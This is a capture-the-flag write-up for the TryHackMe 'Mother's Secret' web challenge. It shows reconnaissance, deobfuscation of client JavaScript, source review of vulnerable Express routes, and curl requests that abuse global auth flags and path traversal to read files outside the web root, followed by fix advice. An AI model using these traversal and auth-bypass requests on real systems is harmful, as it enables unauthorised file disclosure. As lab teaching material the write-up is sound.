# CTF Write-Up: Mother's Secret
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web Application Security (SAST/DAST)  
**Author:** D24yK4r4

---

## Overview

Mother's Secret is a web application challenge themed around the *Alien* franchise. The target simulates the MU-TH-UR 6000 (Mother) shipboard computer from the Nostromo. The player starts with Crew Member access and must escalate privileges through a chain of vulnerable API endpoints to uncover Mother's classified secret.

**Prerequisites:** SAST and DAST rooms (DevSecOps path), or equivalent experience in code analysis and application security.

---

## Reconnaissance

### Nuclei Scan

```bash
nuclei -u http://<TARGET>/
```

**Key findings:**
- `[node-express-dev-env]` — Express running in development mode (verbose errors)
- `[CVE-2023-48795]` — SSH Terrapin vulnerability on port 22 (not the attack vector)
- Port 4040 closed (likely a WebSocket/admin port, not accessible)
- Tech stack confirmed: Node.js + Express + Socket.IO

### Directory Enumeration

Initial Gobuster attempt failed due to wildcard 500 responses:

```
the server returns a status code that matches the provided options for non existing urls.
http://<TARGET>/<random-uuid> => 500 (Length: 42)
```

ffuf with size filtering:

```bash
ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirb/big.txt \
  -e .txt,.yaml,.json -mc 200 -fs 42
```

Result: Only `style/` directory found. No directly accessible files in the public web root.

### Page Source Analysis

`index.html` referenced a single obfuscated script:

```html
<script src="./index.min.js"></script>
```

### JavaScript Deobfuscation

`index.min.js` was heavily obfuscated with array-based string encoding. Manual inspection of the decoded string array revealed:

- Two base64-encoded strings embedded in the client-side code
- Route names: `/yaml`, `/nostromo`
- Character name: `Ash` (Science Officer)
- UI button labels: Alien Loader, Pathways, Role, Flag

**Base64 strings decoded:**

```bash
echo "VEhNX0ZMQUd7MFJEM1JfOTM3fQ==" | base64 -d  # → THM_FLAG{REDACTED}
echo "Q0xBU1NJRklFRA==" | base64 -d               # → CLASSIFIED
```

**Flag 1 found:** `THM_FLAG{REDACTED}`

---

## Source Code Analysis (SAST)

Two API route files were provided as task files.

### yaml.js

```javascript
Router.post("/", (req, res) => {
  let file_path = req.body.file_path;
  const filePath = `./public/${file_path}`;
  if (!isYaml(filePath)) { /* reject */ }
  fs.readFile(filePath, "utf8", (err, data) => {
    res.status(200).send(yaml.load(data));  // ← unsafe yaml.load()
    attachWebSocket().of("/yaml").emit("yaml", "...");
  });
});
```

**Vulnerabilities identified:**
- `yaml.load()` instead of `yaml.safeLoad()` — potential YAML deserialization
- No path sanitization on `file_path` — path traversal possible
- WebSocket event fires on successful read — used as auth signal

### Nostromo.js

```javascript
let isNostromoAuthenticate = false;  // ← global state, not session-based

Router.post("/nostromo", (req, res) => {
  const filePath = `./public/${file_path}`;  // ← no extension check
  fs.readFile(filePath, "utf8", (err, data) => {
    isNostromoAuthenticate = true;  // ← only set on successful read
    res.status(200).send(data);
  });
});

Router.post("/nostromo/mother", (req, res) => {
  const filePath = `./mother/${file_path}`;  // ← different base path
  if (!isNostromoAuthenticate || !isYamlAuthenticate) {
    /* reject */ return;
  }
  fs.readFile(filePath, "utf8", (err, data) => {
    res.status(200).send(data);
  });
});
```

**Vulnerabilities identified:**
- `isNostromoAuthenticate` and `isYamlAuthenticate` are **global module-level variables** — not tied to any session or user. Any successful request from any client sets the flag for all subsequent requests.
- No path sanitization on either route — path traversal via `../`
- `/nostromo/mother` reads from `./mother/` base — a different directory than `./public/`

---

## Route Discovery

Initial attempts using `/__api__/` prefix returned `"You just hit the wrong route."` Testing revealed a mixed prefix structure:

| Route | Prefix | Status |
|-------|--------|--------|
| `/yaml` | none | ✅ Active |
| `/api/nostromo` | `/api/` | ✅ Active |
| `/api/nostromo/mother` | `/api/` | ✅ Active |

---

## Exploitation

### Step 1 — Trigger YAML Auth (Alien Loader)

The task hint stated: *"Emergency command override is REDACTED. Use it when accessing Alien Loaders."*

The override code used as a filename:

```bash
curl -X POST http://<TARGET>/yaml \
  -H "Content-Type: application/json" \
  -d '{"file_path":"REDACTED.yaml"}'
```

**Response:**
```
FOR SCIENCE OFFICER EYES ONLY  special SECRETS:
REROUTING TO: api/nostromo
ORDER: REDACTED.txt [****]
UNABLE TO CLARIFY. NO FURTHER ENHANCEMENT.
```

`isYamlAuthenticate` is now set to `true` server-side.

### Step 2 — Trigger Nostromo Auth

Using the filename revealed in the YAML response:

```bash
curl -X POST http://<TARGET>/api/nostromo \
  -H "Content-Type: application/json" \
  -d '{"file_path":"REDACTED.txt"}'
```

**Response:**
```
Mother
FOR SCIENCE OFFICER EYES ONLY
SPECIAL ORDER REDACTED [............
PRIORITY 1 ****** ENSURE RETURN OF ORGANISM FOR ANALYSIS****]
ALL OTHER CONSIDERATIONS SECONDARY
CREW EXPENDABLE
Flag{REDACTED}
```

`isNostromoAuthenticate` is now set to `true` server-side.

**Flag 2 found:** `Flag{REDACTED}`

### Step 3 — Locate Mother's Secret

With both auth flags set, query the mother route for the secret location:

```bash
curl -X POST http://<TARGET>/api/nostromo/mother \
  -H "Content-Type: application/json" \
  -d '{"file_path":"secret.txt"}'
```

**Response:**
```
Secret: /opt/m0th3r
```

**Mother's secret location:** `REDACTED`

### Step 4 — Path Traversal to Read Mother's Secret

The `/nostromo/mother` route reads from `./mother/` as its base directory. To reach the secret file, traverse up with `../../../../`:

```bash
curl -X POST http://<TARGET>/api/nostromo/mother \
  -H "Content-Type: application/json" \
  -d '{"file_path":"../../../../REDACTED"}'
```

**Response:**
```
Classified information.
Secret: Flag{REDACTED}
```

**Final flag found:** `Flag{REDACTED}`

---

## Answers Summary

| Question | Answer |
|----------|--------|
| Emergency command override number | `REDACTED` |
| Special order number | `REDACTED` |
| Hidden flag in Nostromo route | `Flag{REDACTED}` |
| Science Officer name | `REDACTED` |
| Contents of classified Flag box | `THM_FLAG{REDACTED}` |
| Mother's secret location | `REDACTED` |
| Mother's secret | `Flag{REDACTED}` |

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| Path Traversal | `/yaml`, `/api/nostromo`, `/api/nostromo/mother` | Read arbitrary files from the server filesystem |
| Insecure YAML Deserialization | `yaml.js` — `yaml.load()` | Potential RCE (not required for this challenge) |
| Broken Authentication | `Nostromo.js` — global auth flags | Auth state shared across all clients, trivially bypassable |
| Information Disclosure | `index.min.js` | Flags and sensitive strings exposed in client-side JS |
| Missing Input Validation | All routes | No sanitization of `file_path` parameter |

---

## Key Takeaways

**Authentication must be stateful and session-bound.** Using module-level global variables (`let isAuthenticated = false`) means any client can flip the flag for all other clients — and once set, it never resets.

**Never trust user-supplied file paths.** Without sanitization, `../` sequences allow traversal outside the intended directory. A simple fix is `path.basename()` or rejecting strings containing `..`.

**Client-side code is public.** Obfuscation is not security. Flags, routes, and sensitive strings embedded in JavaScript are recoverable with basic tooling.

**`yaml.load()` is deprecated for a reason.** Always use `yaml.safeLoad()` (or the modern equivalent) when parsing untrusted input.

---

*TryHackMe room: Mother's Secret — D24yK4r4*
